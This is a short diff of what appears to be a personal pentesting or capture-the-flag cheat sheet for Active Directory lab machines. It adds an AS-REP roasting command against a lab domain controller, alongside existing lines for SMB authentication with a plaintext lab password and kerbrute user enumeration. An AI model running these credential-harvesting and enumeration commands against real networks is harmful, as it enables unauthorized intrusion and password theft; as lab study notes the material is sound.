@@ -58,6 +58,7 @@ sudo nxc smb dc.voleur.htb -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
 
 # Aserproast Users without passwords
 GetNPUsers.py -no-pass -usersfile PotADUsers.txt domain.dc/
+GetNPUsers.py -no-pass -dc-ip 10.129.229.17 blackfield.local/support
 
 # Kerbrute to confirm accounts
 ./kerbrute_linux_amd64 userenum --dc 10.129.229.17 -d BLACKFIELD.local -o kerbrute_users usernames.txt
